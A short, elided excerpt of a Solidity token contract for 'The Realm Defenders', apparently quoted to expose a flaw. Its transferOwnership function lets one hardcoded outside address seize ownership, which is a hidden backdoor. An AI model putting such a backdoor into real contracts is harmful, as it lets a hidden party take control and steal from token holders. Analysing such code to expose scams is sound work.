...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x6a7308CEc85A1D3c1b66f1Ad9b7e3d31eeA540F9));
...
contract TheRealmDefenders is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "The Realm Defenders";
